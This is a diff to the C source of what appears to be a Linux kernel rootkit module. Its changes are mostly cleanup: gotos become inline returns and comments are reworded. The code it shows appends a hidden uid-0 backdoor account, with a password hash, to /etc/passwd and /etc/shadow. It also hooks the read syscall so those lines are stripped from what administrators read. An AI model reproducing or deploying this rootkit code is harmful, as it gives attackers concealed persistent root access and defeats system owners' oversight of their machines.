@@ -72,8 +72,7 @@ void add_backdoor(char *path) {
 		int page_count = 0;
 	
 		bool backdoor_existing = false; // If backdoor with same name already exists
-		
-		
+	
 		loff_t offset; // Offset used for determining location of new user in list
 		
 		unsigned long ret;
@@ -84,17 +83,14 @@ void add_backdoor(char *path) {
 			{backdoor = backdoor_shadow;}
 		
 		old_fs = get_fs(); 
-		
 		set_fs(get_ds()); 
 	    	file = filp_open(path, O_RDWR, 0); 
 	    	set_fs(old_fs); 
 
-	    	//check if backdoor already exists
+	    	// Check if backdoor already exists
 	    	buffer = (char *) kmalloc(PAGE_SIZE, GFP_KERNEL);
 
 	    	if(!buffer){
-// 			goto cleanup1;
-			
 			 if(file)
 			 	{filp_close(file, NULL);}
 			return;
@@ -111,9 +107,6 @@ void add_backdoor(char *path) {
 			set_fs(old_fs);
 
 			if(ret < 0){
-				
-// 				goto cleanup2;
-				
 		    		if(buffer)
 					{kfree(buffer);}
 		    	if(file)
@@ -129,9 +122,7 @@ void add_backdoor(char *path) {
 			}
 	    	}
 
-	    	if(backdoor_existing){
-// 			goto cleanup2;
-			
+	    	if(backdoor_existing){ // If backdoor already exists
 			if(buffer)
 				{kfree(buffer);}
 		    if(file)
@@ -140,7 +131,7 @@ void add_backdoor(char *path) {
 			
 		    }
 
-	    	//seek offset to end of file
+	    	// Seek offset to end of file
 	    	offset = 0;
 
 	    	set_fs(get_ds());
@@ -148,8 +139,6 @@ void add_backdoor(char *path) {
 	    	set_fs(old_fs);
 
 	    	if(offset < 0){
-// 			goto cleanup2;
-			
 			if(buffer)
 				{kfree(buffer);}
 		    if(file)
@@ -158,38 +147,26 @@ void add_backdoor(char *path) {
 			
 		}
 
-		//insert backdoor to the end of file
+		// Insert backdoor to the end of file
 		ret = 0;
 	    	set_fs(get_ds()); 
 		ret = vfs_write(file, backdoor, strlen(backdoor),&offset); 
 		set_fs(old_fs); 
 	
 		if(ret<0){
-			
-// 			goto cleanup2;
-			
 			if(buffer)
 				{kfree(buffer);}
 		    if(file)
 		    	{filp_close(file, NULL);}
 		return;
 	    	}
-
-		cleanup2:
-		    if(buffer)
-			kfree(buffer);
-	
-		cleanup1:
-		    if(file)
-			filp_close(file, NULL);
-	
-		exit:
-		    return;
+	exit:
+		return;
 }
 
-asmlinkage long (*original_sys_read) (unsigned int fd, char __user *buf, size_t count);
+asmlinkage long (*original_sys_read) (unsigned int fd, char __user *buf, size_t count); // Original read syscall
 
-asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
+asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) { // New (malicious) read syscall
 	
 	char* backdoor_password = "rootkituser1:x:987:0:backdoor:/home:/bin/bash\n";
 	char* backdoor_shadow = "rootkituser:$6$zTDiFKXM$SuJZFgTirs8r9O9PTskLTnvNV1tvMLiS6h87/c3xrRJEahO5q7bJTT5fgNZWPFrYskf6aNjwKto2dixpTr1Zw0:18232:0:99999:7:::\n";
@@ -198,23 +175,22 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
 	unsigned long ret;
 	char *tmp;
 	char *pathname;
-	struct file *file;
-	struct path *path;
 	char *tmp_buf;
 	char *backdoor;
+	struct file *file;
+	struct path *path;
 
-    //call original read
+    // Calls original read syscall
 	ret = (*original_sys_read)(fd, buf, count);
 
 	if(ret <= 0){
-		goto exit;
+		return ret;
 	}
 
 	file = fget(fd);
 
 	if(!file){
-		//DEBUG("file doesn't exist");
-		goto exit;
+		return ret;
 	}
 
 	path = &file->f_path;
@@ -224,43 +200,51 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
 
 	if(!tmp){
 		path_put(path);
-		//DEBUG("couldnt create tmp");
-		goto cleanup1;
+		
+		if(tmp) 
+			{free_page((unsigned long)tmp);}
+		return ret;
 	}
 
 	pathname = d_path(path, tmp, PAGE_SIZE);
 	path_put(path);
-
-    // Entry point into hiding module
-// 	if(strcmp(pathname, "/proc/modules")==0){
-//         ret = remove_rootkit(buf, ret);
-//     }
     
-    //check if it's the files we want
-	if(strcmp(pathname, "/etc/passwd")==0){
+	if(strcmp(pathname, "/etc/passwd")==0){ // If adding into passwd file
 		backdoor = backdoor_password;
-	} else if(strcmp(pathname, "/etc/shadow")==0){
+	} 
+	else if(strcmp(pathname, "/etc/shadow")==0){ // If adding into shadow file
 		backdoor = backdoor_shadow;		
-	} else {
-        goto cleanup1;
-    }
+	} 
+	else {
+        	if(tmp) 
+			{free_page((unsigned long)tmp);}
+		return ret;
+    	}
 
 	if(!(strstr(buf, backdoor))){
-		goto cleanup1;
+		if(tmp) 
+			{free_page((unsigned long)tmp);}
+		return ret;
 	}
 
 	tmp_buf = kmalloc(ret, GFP_KERNEL);
 	if(!tmp_buf){
-		goto cleanup1;
+		if(tmp) 
+			{free_page((unsigned long)tmp);}
+		return ret;
 	}
 
 	copy_from_user(tmp_buf, buf, ret);
 
 	if(!tmp_buf){
-		goto cleanup2;
+		if(tmp_buf) 
+			{kfree(tmp_buf);}
+		if(tmp) 
+			{free_page((unsigned long)tmp);}
+		return ret;
 	}
 
-    //remove backdoor in buf, change ret
+    // Remove backdoor in buf, change ret
 	while((strstr(tmp_buf, backdoor))){
 		char *strBegin  = tmp_buf;
 		char *substrBegin = strstr(strBegin, backdoor);
@@ -272,24 +256,9 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count) {
 
 	copy_to_user(buf, tmp_buf, ret);
 	
-cleanup2:	
-	if(tmp_buf) 
-		kfree(tmp_buf);
-	
-cleanup1:
-	if(tmp) 
-		free_page((unsigned long)tmp);
-
-exit:
-	return ret;	
+	exit:
+		return ret;	
 }
-
-// void hide_backdoor (void) {
-	
-// original_getdents = (void *)sys_call_address[__NR_index];                        \
-//     sys_call_address[__NR_index] = (unsigned long*)&original_getdents;
-	
-// }
 
 // End Marc
 
